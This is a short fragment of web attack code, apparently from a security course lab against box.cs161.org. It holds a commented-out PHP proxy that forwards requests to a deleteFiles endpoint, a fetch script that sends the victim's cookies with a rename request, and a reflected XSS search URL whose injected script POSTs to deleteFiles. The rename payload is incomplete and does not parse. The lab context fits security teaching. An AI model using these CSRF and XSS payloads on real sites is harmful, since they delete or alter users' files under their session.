<!-- <?php
$url = 'https://box.cs161.org/site/deleteFiles';
$data = file_get_contents('php://input');
$options = array(
  'http' => array(
    'method' => 'POST',
    'header' => "Content-Type: application/json\r\n",
    'content' => $data
  )
);
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);
echo $result;
?> -->




<script>
  // Define the payload data to be sent in the POST request
  const payload = {
    old: 
  };
  
  // Send the POST request using the Fetch API
  fetch('https://box.cs161.org/site/rename', {
    method: 'POST',
    mode: 'cors', // Required to enable CORS
    credentials: 'include', // Required to include cookies in the request
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .then(response => {
    // Handle the response
    console.log(response);
  })
  .catch(error => {
    // Handle any errors
    console.error(error);
  });
</script>



https://box.cs161.org/search?q=<script>fetch("https://box.cs161.org/site/deleteFiles",{method:"POST"})</script>